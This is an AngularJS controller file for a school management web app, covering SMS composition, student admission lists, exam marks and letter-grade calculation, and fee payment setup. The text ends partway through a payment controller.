var app = angular.module("MainApp", ['angularUtils.directives.dirPagination']);


// var url =  window.location.origin + '/bbgc/ajax/';
// var siteurl =  window.location.origin + '/bbgc/';

var url = window.location.origin + '/ajax/';
var siteurl = window.location.origin + '/';

app.constant("appConfig", {
    "marks": [80, 70, 60, 50, 40, 33, 0],
    "letterToPoint": { "A+": 5, "A": 4, "A-": 3.5, "B": 3, "C": 2, "D": 1, "F": 0 }
});

//remove underscore and ucwords
app.filter("textBeautify", function() {
    return function(str) {
        var str = str.replace(/_/gi, " ").toLowerCase(),
            txt = str.replace(/\b[a-z]/g, function(letter) {
                return letter.toUpperCase();
            });

        return txt;
    }
});

//remove dash and ucwords
app.filter("removeDash", function() {
    return function(str) {
        var str = str.replace(/-/gi, " ").toLowerCase();
        txt = str.replace(/\b[a-z]/g, function(letter) {
            return letter.toUpperCase();
        });
        return txt;
    }
});


app.controller('PaginationDemoCtrl', function($scope, $log) {
    $scope.totalItems = 64;
    $scope.currentPage = 4;

    $scope.setPage = function(pageNo) {
        $scope.currentPage = pageNo;
    };

    $scope.pageChanged = function() {
        $log.log('Page changed to: ' + $scope.currentPage);
    };

    $scope.maxSize = 5;
    $scope.bigTotalItems = 175;
    $scope.bigCurrentPage = 1;
    $scope.numPages = 18;
});



//SMS Controller
app.controller("CustomSMSCtrl", ["$scope", "$log", function($scope, $log) {
    $scope.msgContant = "";
    $scope.totalChar = 0;
    $scope.msgSize = 1;

    $scope.messageFn = function() {
        $scope.$watch(function() {
            var charLength = $scope.msgContant.length,
                message = $scope.msgContant,
                messLen = 0;




            var english = /^[~!@#$%^&*(){},.:/-_=+A-Za-z0-9 ]*$/;

            if (english.test(message)) {
                if (charLength <= 160) { messLen = 1; } else if (charLength <= 306) { messLen = 2; } else if (charLength <= 459) { messLen = 3; } else if (charLength <= 612) { messLen = 4; } else if (charLength <= 765) { messLen = 5; } else if (charLength <= 918) { messLen = 6; } else if (charLength <= 1071) { messLen = 7; } else if (charLength <= 1080) { messLen = 8; } else { messLen = "Equal to an MMS!"; }

            } else {
                if (charLength <= 63) { messLen = 1; } else if (charLength <= 126) { messLen = 2; } else if (charLength <= 189) { messLen = 3; } else if (charLength <= 252) { messLen = 4; } else if (charLength <= 315) { messLen = 5; } else if (charLength <= 378) { messLen = 6; } else if (charLength <= 441) { messLen = 7; } else if (charLength <= 504) { messLen = 8; } else { messLen = "Equal to an MMS!"; }
            }



            $scope.totalChar = charLength + 48;
            //console.log($scope.totalChar);
            $scope.msgSize = messLen;
        });
    }
}]);





/*app.controller("studentSMSCtrl", ["$scope", "$log","$http", function($scope, $log,$http){
	$scope.msgContant = "";
	$scope.totalChar = 0;
	$scope.msgSize = 1;
	


	$scope.personeInfo= function(){
	$scope.result = [];		
		
		if($scope.persone != "committee_members"){
			
			var where = {
				table:'student',
				cond:{student_type: $scope.persone }
			}
		}else{
			var where = {
				table:'committee_members',
			}
		}
		
		console.log(where);
		
		$http({
			method : "POST",
			url  : url+ 'read',
			data : where
		}).success(function(responce){
		   // console.log(responce);
			
			if(responce.length > 0){
			 angular.forEach(responce,function(row,index){			 
			
				 if(row.hasOwnProperty("mobile_number")){
				    row['mobile_number'] = row.employee_mobile;
				    row['students_name'] = row.students_name;
				 }else{
				   row['mobile'] = row.member_mobile_number;
				   row['name'] = row.applicant_name;
				 }
				 
			 	 $scope.result.push(row);	 
			});
				
			}else{
			  $scope.result = [];
			}
			
			console.log($scope.result);
		});
	}
	
	
	
	
	
	$scope.$watch(function(){
		var charLength = $scope.msgContant.length,
			messLen = 0;

		if( charLength <= 160){ messLen = 1; }
		else if( charLength <= 306){ messLen = 2; }
		else if( charLength <= 459){ messLen = 3; }
		else if( charLength <= 612){ messLen = 4; }
		else if( charLength <= 765){ messLen = 5; }
		else if( charLength <= 918){ messLen = 6; }
		else if( charLength <= 1071){ messLen = 7; }
		else if( charLength <= 1080){ messLen = 8; }
		else { messLen = "Equal to an MMS."; }

		$scope.totalChar = charLength;
		$scope.msgSize = messLen;
	});
}]);*/



//cost controller start here
app.controller("costCtrl", ['$scope', '$http', function($scope, $http) {

    $scope.perPage = "10";
    $scope.reverse = false;
    $scope.fields = [];

    var obj = {
        table: "cost_field"
    };

    $http({
        method: "POST",
        url: url + "read",
        data: obj
    }).success(function(response) {
        if (response.length > 0) {
            angular.forEach(response, function(values, index) {
                values['sl'] = index + 1;
                $scope.fields.push(values);
            });
            console.log($scope.fields);
        } else {
            $scope.fields = [];
        }
    });
}]);


app.controller("staffSMSCtrl", ["$scope", "$log", "$http", function($scope, $log, $http) {
    $scope.msgContant = "";
    $scope.totalChar = 0;
    $scope.msgSize = 1;



    $scope.personeInfo = function() {
        $scope.result = [];

        if ($scope.persone != "committee_members") {

            var where = {
                table: 'employee',
                cond: { employee_type: $scope.persone }
            }
        } else {
            var where = {
                table: 'committee_members',
            }
        }

        console.log(where);

        $http({
            method: "POST",
            url: url + 'read',
            data: where
        }).success(function(responce) {
            // console.log(responce);

            if (responce.length > 0) {
                angular.forEach(responce, function(row, index) {

                    if (row.hasOwnProperty("employee_mobile")) {
                        row['mobile'] = row.employee_mobile;
                        row['employee_name'] = row.employee_name;
                    } else {
                        row['mobile'] = row.member_mobile_number;
                        row['name'] = row.applicant_name;
                    }

                    $scope.result.push(row);
                });

            } else {
                $scope.result = [];
            }

            console.log($scope.result);
        });
    }




    /*	$scope.messageFn = function(){
        	$scope.$watch(function(){
        		var charLength = $scope.msgContant.length,
        			messLen = 0;
        
        		if( charLength <= 160){ messLen = 1; }
        		else if( charLength <= 306){ messLen = 2; }
        		else if( charLength <= 459){ messLen = 3; }
        		else if( charLength <= 612){ messLen = 4; }
        		else if( charLength <= 765){ messLen = 5; }
        		else if( charLength <= 918){ messLen = 6; }
        		else if( charLength <= 1071){ messLen = 7; }
        		else if( charLength <= 1080){ messLen = 8; }
        		else { messLen = "Equal to an MMS."; }
        
        		$scope.totalChar = charLength+48;
        		$scope.msgSize = messLen;
        	});
    	}*/


    $scope.msgContant = "";
    $scope.totalChar = 0;
    $scope.msgSize = 1;

    $scope.messageFn = function() {
        $scope.$watch(function() {
            var charLength = $scope.msgContant.length,
                message = $scope.msgContant,
                messLen = 0;




            var english = /^[~!@#$%^&*(){},.:/-_=+A-Za-z0-9 ]*$/;

            if (english.test(message)) {
                if (charLength <= 160) { messLen = 1; } else if (charLength <= 306) { messLen = 2; } else if (charLength <= 459) { messLen = 3; } else if (charLength <= 612) { messLen = 4; } else if (charLength <= 765) { messLen = 5; } else if (charLength <= 918) { messLen = 6; } else if (charLength <= 1071) { messLen = 7; } else if (charLength <= 1080) { messLen = 8; } else { messLen = "Equal to an MMS!"; }

            } else {
                if (charLength <= 63) { messLen = 1; } else if (charLength <= 126) { messLen = 2; } else if (charLength <= 189) { messLen = 3; } else if (charLength <= 252) { messLen = 4; } else if (charLength <= 315) { messLen = 5; } else if (charLength <= 378) { messLen = 6; } else if (charLength <= 441) { messLen = 7; } else if (charLength <= 504) { messLen = 8; } else { messLen = "Equal to an MMS!"; }
            }



            $scope.totalChar = charLength + 48;
            //console.log($scope.totalChar);
            $scope.msgSize = messLen;
        });
    }



}]);



// Registration Controller
app.controller('registrationCtrl', function($scope) {

    // check if present & permanent address are same or not
    $scope.check = function() {
        var value = $scope.checkbox;
        if (value) {
            $scope.permanent_address = $scope.present_address;
        } else {
            $scope.permanent_address = " ";
        }
    }

});

// Edit Controller
app.controller('editCtrl', function($scope) {

    // check if present & permanent address are same or not
    $scope.check = function() {
        var value = $scope.checkbox;
        if (value) {
            $scope.permanent_address = $scope.present_address;
        } else {
            $scope.permanent_address = " ";
        }
    }

});


// show all student Controller

app.controller('ShowAllStudentCtrl', function($scope, $http) {
    $scope.reverse = true;

    $scope.getAllStudentsFn = function() {
        var where = {
            table: 'registration',
            cond: { session: $scope.session, class: $scope.class, section: $scope.section, group: $scope.group, status: 'registered' }
        };
        console.log(where);
        console.log(2);

        $http({
            method: 'POST',
            url: url + 'read',
            data: where
        }).success(function(response) {
            if (response.length > 0) {
                $scope.active = false;
                $scope.allStudents = response;
            } else {
                $scope.active = true;
            }
            console.log(response);
        });
    }
});



// all Admission students
app.controller('ShowAllAdmissionStudentCtrl', function($scope, $http) {
    $scope.reverse = false;
    $scope.search = {};
    $scope.allStudents = [];
    $scope.status1 = '';
    $scope.perPage = "50";

    $scope.change_status = function(status, id) {

        //updating admission table
        var where = {
            table: 'admission',
            data: { student_status: status },
            cond: { student_id: id }
        };


        $http({
            method: 'POST',
            url: siteurl + 'registration/registration/ajax_change_status',
            data: where
        }).success(function(response) {
            if (response.match("success")) {
                console.log("Successfully Updated!");
            }
        });

        //updating registration table
        var where = {
            table: 'registration',
            data: { student_status: status },
            cond: { reg_id: id }
        };
        $http({
            method: 'POST',
            url: siteurl + 'registration/registration/ajax_change_status',
            data: where
        }).success(function(response) {
            if (response.match("success")) {
                alert("Status Successfully Updated");
            }
        });
    }

    $scope.getAllStudentsFn = function() {
        var transmit = {
            from: 'admission',
            join: 'registration',
            cond: 'admission.student_id=registration.reg_id',
            order_colum: 'admission.roll',
            order_by : 'ASC'
        };

        var where = {};
        if (Object.keys($scope.search).length !== 0 && $scope.search.constructor === Object) {
            angular.forEach($scope.search, function(item, index) {
                if (item !== "") {
                    where['admission.' + index] = item;
                }
            });
            
            transmit['where'] = (where ? where : []);
        }


        $http({
            method: 'POST',
            url: url + 'readJoinData',
            data: transmit
        }).success(function(response) {
            if (response.length > 0) {
                $scope.active = false;

                angular.forEach(response, function(row, index) {
                    var joined = [];

                    response[index].sl = index + 1;
                    response[index].student_id = parseInt(row.student_id);
                    response[index].roll = parseInt(row.roll);
                    response[index].session = parseInt(row.session);
                    response[index].address = row.present_address;
                });

                $scope.allStudents = response;
            } else {
                $scope.active = true;
            }

            //console.log($scope.allStudents);
        });
    }
});


// get admission student info Ctrl
app.controller("getStudentInfoCtrl", function($scope, $http) {
    $scope.$watch("student_id", function() {
        var where = {
            table: 'registration',
            cond: { 'id': $scope.student_id }
        };

        $http({
            method: 'POST',
            url: url + 'read',
            data: where
        }).success(function(response) {
            if (response.length == 1) {
                $scope.class = response[0].class;
                $scope.group = response[0].group;
                $scope.session = response[0].session;
                $scope.section = response[0].section;
                $scope.photo = response[0].photo;
            } else {
                $scope.class = "";
                $scope.group = "";
                $scope.session = "";
                $scope.photo = "";
            }
            console.log(response);
        });
    });
});


// show all subject Controller

app.controller('allSubjectCtrl', function($scope, $http) {

    $scope.reverse = true;

    $scope.allsubjectFn = function() {

        var where = {
            table: 'subject',
            cond: $scope.search
        };

        $http({
            method: 'POST',
            url: url + 'read',
            data: where
        }).success(function(response) {
            if (response.length > 0) {
                $scope.active = false;
                $scope.allSubjects = response;
            } else {
                $scope.active = true;
            }

            console.log(response);
        });
    }

});






app.controller("SetExamCtrl", function($scope, $log, $http) {
    $scope.totalFn = function(o, w, p) {
        return (o + w + p);
    }


    $scope.getExamInfo = function() {
        var where = {
            table: "all_exam",
            cond: {
                code: $scope.exam_name
            }
        };

        $http({
            method: "POST",
            url: url + "read",
            data: where
        }).success(function(response) {
            if (response.length == 1) {
                $scope.exam_date = response[0].start_at;
            } else {
                $scope.exam_date = "";
            }
        });
    };
});

app.controller("EditExamCtrl", function($scope, $log) {
    $scope.totalFn = function(o, w, p) {
        return (o + w + p);
    }
});





app.controller("MarksCtrl", function($scope, $log, $http, appConfig) {
    // $log.info(appConfig.letterToPoint);
    $scope.students = [];
    $scope.subject = {};
    $scope.sort = "roll";



    //get exam type info
    $scope.getExamTypeInfoFn = function() {
        var where = {
            table: "exam",
            cond: { exam_id: $scope.examID }
        };

        $http({
            method: "POST",
            url: url + "read",
            data: where
        }).success(function(response) {
            var type = response[0].type;
            $scope.exam_type = response[0].type;

            if (type === "final" || type === "half_yearly") {
                $scope.row_active = false;
            } else {
                $scope.row_active = true;
            }

            console.log(type);

        });
    };

    // get students
    $scope.getAllStudents = function() {

        $scope.sess = parseInt($scope.year) + 1;
        var session = $scope.year + "-" + $scope.sess;

        var where = {
            table: "admission",
            cond: {
                "session": session,
                //"YEAR(date)": $scope.year,
                "class": $scope.class
            }
        };

        if ($scope.group != undefined && $scope.group != "") {
            where.cond.group = $scope.group;
        }

        if ($scope.section != undefined && $scope.section != "") {
            where.cond.section = $scope.section;
        }

        console.log(where);

        $http({
            method: "POST",
            url: url + "readstu",
            data: where
        }).success(function(response) {

            console.log(response);

            $scope.students = [];
            if (response.length > 0) {
                angular.forEach(response, function(row) {
                    row.roll = parseInt(row.roll);
                    row.attendance = 0.00;
                    row.monthlyTest = 0.00;
                    row.objective = 0.00;
                    row.written = 0.00;
                    row.practical = 0.00;
                    row.name = '';

                    var where = {
                        table: "registration",
                        cond: { reg_id: row.student_id }
                    };

                    $http({
                        method: "POST",
                        url: url + "read",
                        data: where
                    }).success(function(studentInfo) {
                        row.name = studentInfo[0].name;
                        $scope.students.push(row);
                    });
                });
                $scope.active = false;
            } else {
                $scope.active = true;
                $scope.students = [];
            }

            $scope.totalStudent = $scope.students.length;
            //console.log(response);
        });



        // get subject info
        var sub = $scope.subjectName,
            part = $scope.paper,
            subject_name;
        if (part == "1st") {
            subject_name = sub + " " + part;
        } else if (part == "2nd") {
            subject_name = sub + " " + part;
        } else {
            subject_name = sub;
        }
        var where = {
            table: "exam",
            cond: {
                "exam_id": $scope.examID,
                "subject": subject_name
            }
        };

        //console.log(where);

        $http({
            method: "POST",
            url: url + "read",
            data: where
        }).success(function(response) {
            var obj = {
                objective: parseFloat(response[0].objective),
                objectivePassMark: parseFloat(response[0].objective_pass_mark),
                written: parseFloat(response[0].written),
                writtenPassMark: parseFloat(response[0].written_pass_mark),
                practical: parseFloat(response[0].practical),
                practicalPassMark: parseFloat(response[0].practical_pass_mark),
                total: (parseFloat(response[0].objective) + parseFloat(response[0].written) + parseFloat(response[0].practical))
            };

            $scope.subject = obj;
            $scope.subjectCode = response[0].subject_code;
            console.log($scope.subject);

        });
    }

    $scope.totalMarksFn = function(roll) {
        var at = mt = ft = 0.00;
        var i = $scope.students.map(function(student) { return student.roll; }).indexOf(roll);

        if ($scope.exam_type === "final" || $scope.exam_type == "half_yearly") {
            ft = $scope.students[i].objective + $scope.students[i].written + $scope.students[i].practical;
            ft = parseFloat((ft * 89) / 100);
            at = parseFloat($scope.students[i].attendance);
            mt = parseFloat(($scope.students[i].monthlyTest * 20) / 100);
            $scope.students[i].total = (at + mt + ft).toFixed(2);
        } else {
            var result = $scope.students[i].objective + $scope.students[i].written + $scope.students[i].practical;
            $scope.students[i].total = (result).toFixed(2);
        }
        return $scope.students[i].total;
    }



    $scope.letterGradeFn = function(roll) {
        var i = $scope.students.map(function(student) { return student.roll; }).indexOf(roll);
        var total = ($scope.students[i].total * 100) / $scope.subject.total,
            objectiveStatus = ($scope.students[i].objective >= $scope.subject.objectivePassMark) ? true : false,
            writtenStatus = ($scope.students[i].written >= $scope.subject.writtenPassMark) ? true : false,
            practicalStatus = ($scope.students[i].practical >= $scope.subject.practicalPassMark) ? true : false,
            letter;

        if (total >= 80 && objectiveStatus && writtenStatus && practicalStatus) { letter = "A+"; } else if (total >= 70 && objectiveStatus && writtenStatus && practicalStatus) { letter = "A"; } else if (total >= 60 && objectiveStatus && writtenStatus && practicalStatus) { letter = "A-"; } else if (total >= 50 && objectiveStatus && writtenStatus && practicalStatus) { letter = "B"; } else if (total >= 40 && objectiveStatus && writtenStatus && practicalStatus) { letter = "C"; } else if (total >= 33 && objectiveStatus && writtenStatus && practicalStatus) { letter = "D"; } else { letter = "F"; }

        $scope.students[i].letter = letter;

        return $scope.students[i].letter;

    }

    $scope.gradePointFn = function(roll) {
        var i = $scope.students.map(function(student) { return student.roll; }).indexOf(roll);
        var letter = $scope.students[i].letter;
        return appConfig.letterToPoint[letter];
    }
});




app.controller("AllMarksCtrl", function($scope, $http, $log) {
    $scope.marks = [];

    $scope.getMarksFn = function() {
        $scope.search.subject = $scope.search.subject_name;
        if (typeof $scope.paper != "undefined") {
            $scope.search.subject = $scope.search.subject_name + " " + $scope.paper;
        }
        var where = {
            table: "marks",
            cond: $scope.search
        };
        console.log(where);

        $http({
            method: "POST",
            url: url + "read",
            data: where
        }).success(function(response) {
            console.log(response);
            $scope.marks = [];
            if (response.length > 0) {
                console.log(response);
                angular.forEach(response, function(obj) {
                    $scope.marks.push(obj);
                });
                $scope.active = false;
            } else {
                $scope.active = true;
                $scope.marks = [];
            }
        });
    }

});


app.controller("EditMarksCtrl", function($scope, $http, $log, appConfig) {
    $scope.marks = [];

    $scope.$watch("id", function() {
        var where = {
            table: "marks",
            cond: {
                "id": $scope.id
            }
        };

        $http({
            method: "POST",
            url: url + "read",
            data: where
        }).success(function(response) {
            angular.forEach(response, function(row) {
                row.attendance = parseFloat(row.at);
                row.monthlyTest = parseFloat(row.mt);
                row.objective = parseFloat(row.objective);
                row.written = parseFloat(row.written);
                row.practical = parseFloat(row.practical);

                // get subject
                var where = { table: "exam", cond: { "exam_id": row.exam_id, "subject": row.subject } };
                $http({
                    method: "POST",
                    url: url + "read",
                    data: where
                }).success(function(response) {
                    if (response[0].type === "final" || response[0].type === "half_yearly") {
                        $scope.row_active = false;
                    } else {
                        $scope.row_active = true;
                    }

                    row.type = response[0].type;


                    row.objectiveMark = parseFloat(response[0].objective);
                    row.objectivePassMark = parseFloat(response[0].objective_pass_mark);
                    row.writtenMark = parseFloat(response[0].written);
                    row.writtenPassMark = parseFloat(response[0].written_pass_mark);
                    row.practicalMark = parseFloat(response[0].practical);
                    row.practicalPassMark = parseFloat(response[0].practical_pass_mark);
                    row.totalMark = (parseFloat(response[0].objective) + parseFloat(response[0].written) + parseFloat(response[0].practical));
                });

                $scope.marks.push(row);

            });
        });

        $scope.totalMarksFn = function(i) {
            var at = mt = ft = 0.00;

            if ($scope.marks[i].type === "final" || $scope.marks[i].type === "half_yearly") {
                ft = $scope.marks[i].objective + $scope.marks[i].written + $scope.marks[i].practical;
                ft = parseFloat((ft * 89) / 100);
                at = parseFloat($scope.marks[i].attendance);
                mt = parseFloat(($scope.marks[i].monthlyTest * 20) / 100);
                $scope.marks[i].total = (at + mt + ft).toFixed(2);
            } else {
                var result = $scope.marks[i].objective + $scope.marks[i].written + $scope.marks[i].practical;
                $scope.marks[i].total = result;
            }


            return $scope.marks[i].total;
        }






        $scope.letterGradeFn = function(i) {
            var total = ($scope.marks[i].total * 100) / $scope.marks[i].totalMark,
                objectiveStatus = ($scope.marks[i].objective >= $scope.marks[i].objectivePassMark) ? true : false,
                writtenStatus = ($scope.marks[i].written >= $scope.marks[i].writtenPassMark) ? true : false,
                practicalStatus = ($scope.marks[i].practical >= $scope.marks[i].practicalPassMark) ? true : false,
                letter;

            if (total >= 80 && objectiveStatus && writtenStatus && practicalStatus) { letter = "A+"; } else if (total >= 70 && objectiveStatus && writtenStatus && practicalStatus) { letter = "A"; } else if (total >= 60 && objectiveStatus && writtenStatus && practicalStatus) { letter = "A-"; } else if (total >= 50 && objectiveStatus && writtenStatus && practicalStatus) { letter = "B"; } else if (total >= 40 && objectiveStatus && writtenStatus && practicalStatus) { letter = "C"; } else if (total >= 33 && objectiveStatus && writtenStatus && practicalStatus) { letter = "D"; } else { letter = "F"; }

            $scope.marks[i].letter = letter;

            return $scope.marks[i].letter;
        }

        $scope.gradePointFn = function(i) {
            var letter = $scope.marks[i].letter;
            $scope.marks[i].point = appConfig.letterToPoint[letter];

            return $scope.marks[i].point;
        }
    });
});





//updatemarks for individual student
app.controller("updateMarksCtrl", function($scope, $http, appConfig) {
    $scope.details = {};

    $scope.active = true;
    $scope.getAllMarks = function() {
        $scope.allMarks = [];

        var where = {
            table: "marks",
            cond: $scope.search
        };
        //console.log(where);

        $http({
            method: "POST",
            url: url + "read",
            data: where
        }).success(function(response) {
            //console.log(response);
            if (response.length > 0) {
                angular.forEach(response, function(item, index) {
                    item.student_ai_id = response[0].student_id;
                    $scope.details.roll = response[0].roll;


                    // get student information ......
                    var regWhere = {
                        table: "registration",
                        cond: { id: response[0].student_id }
                    };
                    //console.log(regWhere);

                    $http({
                        method: "POST",
                        url: url + "read",
                        data: regWhere
                    }).success(function(regResponse) {
                        $scope.details.student_name = regResponse[0].en_student_name;
                        $scope.details.student_photo = regResponse[0].students_photo;
                        $scope.details.reg_id = regResponse[0].reg_id;
                        $scope.details.class = regResponse[0].class;
                    });
                    // get student information END ......


                    // get subject info........
                    var examWhere = {
                        table: "exam",
                        cond: {
                            "exam_id": item.exam_id,
                            "class": item.class,
                            "subject": item.subject
                        }
                    };

                    $http({
                        method: "POST",
                        url: url + "read",
                        data: examWhere
                    }).success(function(result) {
                        //console.log(result);

                        if (result.length > 0) {

                            if (result[0].type === "final" || result[0].type === "half_yearly") {
                                $scope.row_active = false;
                            } else {
                                $scope.row_active = true;
                            }

                            item.type = result[0].type;
                            item.exam_objective = parseFloat(result[0].objective);
                            item.exam_objectivePassMark = parseFloat(result[0].objective_pass_mark);
                            item.exam_written = parseFloat(result[0].written);
                            item.exam_writtenPassMark = parseFloat(result[0].written_pass_mark);
                            item.exam_practical = parseFloat(result[0].practical);
                            item.exam_practicalPassMark = parseFloat(result[0].practical_pass_mark);
                            item.exam_total = (parseFloat(result[0].objective) + parseFloat(result[0].written) + parseFloat(result[0].practical));
                            item.attendance = parseFloat(item.at);
                            item.monthlyTest = parseFloat(item.mt);
                            item.objective = parseFloat(item.objective);
                            item.written = parseFloat(item.written);
                            item.practical = parseFloat(item.practical);

                            $scope.allMarks.push(item);
                        }
                    });
                    // get subject info END ........
                });
                $scope.active = false;
            } else {
                $scope.allMarks = [];
                $scope.active = true;
            }
            //console.log($scope.allMarks);
        });
    };


    $scope.totalMarksFn = function(i) {
        var at = mt = ft = 0.00;
        $scope.allMarks[i].total = 0.00;
        //console.log($scope.allMarks[i]);

        if ($scope.allMarks[i].type === "final" || $scope.allMarks[i].type === "half_yearly") {

            ft = parseFloat($scope.allMarks[i].objective) + parseFloat($scope.allMarks[i].written) + parseFloat($scope.allMarks[i].practical);
            ft = parseFloat((ft * 89) / 100);
            at = parseFloat($scope.allMarks[i].attendance);
            mt = parseFloat(($scope.allMarks[i].monthlyTest * 20) / 100);
            $scope.allMarks[i].total = (at + mt + ft).toFixed(2);

        } else {
            //console.log($scope.allMarks[i].objective);

            var _objective = (typeof $scope.allMarks[i].objective != "undefined") ? $scope.allMarks[i].objective : 0.00;
            var _written = (typeof $scope.allMarks[i].written != "undefined") ? $scope.allMarks[i].written : 0.00;
            var _practical = (typeof $scope.allMarks[i].practical != "undefined") ? $scope.allMarks[i].practical : 0.00;

            var result = parseFloat(_objective) + parseFloat(_written) + parseFloat(_practical);
            $scope.allMarks[i].total = result;
        }
        return $scope.allMarks[i].total;
    }


    $scope.letterGradeFn = function(i) {
        var total = ($scope.allMarks[i].total * 100) / $scope.allMarks[i].exam_total,
            objectiveStatus = ($scope.allMarks[i].objective >= $scope.allMarks[i].exam_objectivePassMark) ? true : false,
            writtenStatus = ($scope.allMarks[i].written >= $scope.allMarks[i].exam_writtenPassMark) ? true : false,
            practicalStatus = ($scope.allMarks[i].practical >= $scope.allMarks[i].exam_practicalPassMark) ? true : false,
            letter;

        if (total >= 80 && objectiveStatus && writtenStatus && practicalStatus) { letter = "A+"; } else if (total >= 70 && objectiveStatus && writtenStatus && practicalStatus) { letter = "A"; } else if (total >= 60 && objectiveStatus && writtenStatus && practicalStatus) { letter = "A-"; } else if (total >= 50 && objectiveStatus && writtenStatus && practicalStatus) { letter = "B"; } else if (total >= 40 && objectiveStatus && writtenStatus && practicalStatus) { letter = "C"; } else if (total >= 33 && objectiveStatus && writtenStatus && practicalStatus) { letter = "D"; } else { letter = "F"; }

        $scope.allMarks[i].letter = letter;
        return $scope.allMarks[i].letter;
    }


    $scope.gradePointFn = function(i) {
        var letter = $scope.allMarks[i].letter;
        $scope.allMarks[i].point = appConfig.letterToPoint[letter];
        return $scope.allMarks[i].point;
    }

});

//student validaty date Set

app.controller("studentValidity", ["$scope", "$http", function($scope, $http) {

    $scope.student = [];
    $scope.validity = "";
    $scope.getStudentFn = function() {

        if ($scope.studentClass != null) {
            var where = {
                table: "admission",
                column: "class",
                cond: { class: $scope.studentClass }
            };

            $http({
                method: "POST",
                url: url + "readGroupBy",
                data: where
            }).success(function(response) {
                if (response.length > 0) {
                    $scope.validity = response[0].validity;
                    console.log(response);
                }
            });
        }

    }


}]);

//paymentFieldCtrl controller start here
app.controller("paymentFieldCtrl", ['$scope', '$http', function($scope, $http) {

    $scope.perPage = "0";
    $scope.reverse = false;
    $scope.fields = [];

    var obj = {
        table: "payment_field"
    };

    $http({
        method: "POST",
        url: url + "result",
        data: obj
    }).success(function(response) {
        
        if (response.length > 0) {
            angular.forEach(response, function(values, index) {
                values['sl'] = index + 1;
                $scope.fields.push(values);
            });
        } else {
            $scope.fields = [];
        }
    });
}]);

// payment set controller
app.controller("paymentSetCtrl", ['$scope', '$http', function($scope, $http) {
    $scope.active = true;
    $scope.allFields = [];

    $scope.getPaymentInfoFn = function() {
        if (typeof $scope.search.class != "undefined" && typeof $scope.search.section != "undefined") {
            
            var where = { table: "payment_field" };
            $http({
                method: "POST",
                url: url + "read",
                data: where
            }).success(function(response) {
                if (response.length > 0) {
                    
                    $scope.allFields = [];
                   
                    $scope.active = false;
                    
                    angular.forEach(response, function(row, index) {
                        
                        var where = { 
                            table: "set_payment", 
                            cond: {class: $scope.search.class, section: $scope.search.section, field_name: row.field_name} 
                        };
                        $http({
                            method: "POST",
                            url: url + "result",
                            data: where,
                            select: ['field_name', 'amount']
                        }).success(function(setResponse) {
                            
                            var item = {};
                            if (setResponse.length > 0) {
                                
                                item.field_name = setResponse[0].field_name;
                                item.amount     = setResponse[0].amount;
                            } else {
                                
                                item.field_name = row.field_name;
                                item.amount     = row.amount;
                            }
                            
                            $scope.allFields.push(item);
                        });
                    });
                }
            });
        }
    };

}]);

// payment Field Setting controller
app.controller("paymentFieldSettingCtrl", ['$scope', '$http', function($scope, $http) {
    $scope.active = true;
    $scope.allFields = [];

    $scope.getPaymentFieldInfoFn = function() {
        $scope.allFields = [];
        if (typeof $scope.search.class != "undefined" && typeof $scope.search.section != "undefined" && typeof $scope.month != "undefined") {
            
            var where = {
                tableFrom: "set_payment",
                tableTo: "payment_field",
                joinCond: "set_payment.field_name=payment_field.field_name",
                cond: {
                    'set_payment.class': $scope.search.class,
                    'set_payment.section': $scope.search.section,
                },
                select: ['set_payment.*'],
            };

            $http({
                method: "POST",
                url: url + "join",
                data: where
            }).success(function(response) {
                if (response.length > 0) {
                    
                    $scope.active = false;
                    
                    angular.forEach(response, function(row, index) {
                        
                        // Check payment field already set up or not
                        var where = {
                            table: "payment_setting",
                            cond: {
                                'set_payment_id': row.id,
                                'month': $scope.month
                            }
                        };

                        $http({
                            method: "POST",
                            url: url + "read",
                            data: where
                        }).success(function(item) {
                            if (item.length > 0) {
                                row['check'] = true;
                            } else {
                                row['check'] = false;
                            }

                            $scope.allFields.push(row);
                        });
                    });
                } else {
                    $scope.active = true;
                    $scope.allFields = [];
                }

                //console.log($scope.allFields);
            });
        }
    };

}]);

app.controller("studentPaymentEditCtrl", function($scope, $http) {
    

    
    $scope.$watch('invoice_no', function(invoice_no){

        $scope.cart = [];
        
        if(typeof invoice_no !== 'undefined' && invoice_no != ''){
            
            $http({
                method: 'post',
                url   : url + 'result',
                data  : {
                    table: 'payment',
                    cond : {invoice_no: invoice_no, trash: '0'},
                    select: ['id', 'field', 'amount']
                }
            }).success(function(invoiceInfo){

                if(invoiceInfo.length > 0){
                    angular.forEach(invoiceInfo, function(item, index){
                        item.old_amount = parseFloat(item.amount);
                        item.amount = parseFloat(item.amount);
                        $scope.cart.push(item);
                    });
                }
            });
        }
    });

    // add new field
    $scope.addFieldFn = function (field){

        if (typeof field !== 'undefined' && field != ''){
            var item = {
                id: '',
                field: field,
                amount: ''
            };
            $scope.cart.push(item);
        }
    }
    
    // get total amount
    $scope.getTotalAmount = function(){
        var total = 0;
        angular.forEach($scope.cart, function(row, index){
            total += (!isNaN(parseFloat(row.amount)) ? parseFloat(row.amount) : 0);
        });
        return total.toFixed(2);
    };

    $scope.trashCart = [];

    $scope.removeCartItem = function (index){

        if ($scope.cart[index].id != ''){

            var alert = confirm('Do you want to delete this data?');

            if (alert){
                $scope.trashCart.push($scope.cart[index].id);
                $scope.cart.splice(index, 1);
            }

        } else {

            $scope.cart.splice(index, 1);
        }
    }
});


app.controller("studentPaymentCtrl", ['$scope', '$http', function($scope, $http) {
    
    $scope.allMonths = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
    $scope.paymentMonths = { "0": "0", "1": "0", "2": "0", "3": "0", "4": "0", "5": "0", "6": "0", "7": "0", "8": "0", "9": "0", "10": "0", "11": "0" };

    $scope.active = true;
    $scope.active1 = true;
    $scope.studentsInfo = [];
    $scope.studentsPaymentInfo = [];
    $scope.studentsPaymentFields = [];


    // set student global info
    $scope.class = $scope.section = $scope.type = "";

    // fetch student basic info
    $scope.getStudentInfoFn = function() {
        var condition = {
            from: "admission",
            join: "registration",
            cond: "admission.student_id = registration.reg_id",
            where: {
                'admission.student_id': $scope.student_id
            }
        };
        console.log($scope.student_id);
        $http({
            method: "POST",
            url: url + "readJoinDataStudentView",
            data: condition
        }).success(function(response) {
            console.log(response);
            if (response.length > 0) {
                $scope.active = false;
                $scope.studentsInfo = response;

                $scope.class = response[0].class;
                $scope.section = response[0].section;
                //$scope.type = response[0].type;
            } else {
                $scope.active = true;
                $scope.studentsInfo = [];



                $scope.class = "";
                $scope.section = "";
                $scope.type = "";
            }

            // console.log($scope.studentsInfo);

        });

    }

    // Fetch Student Payment history
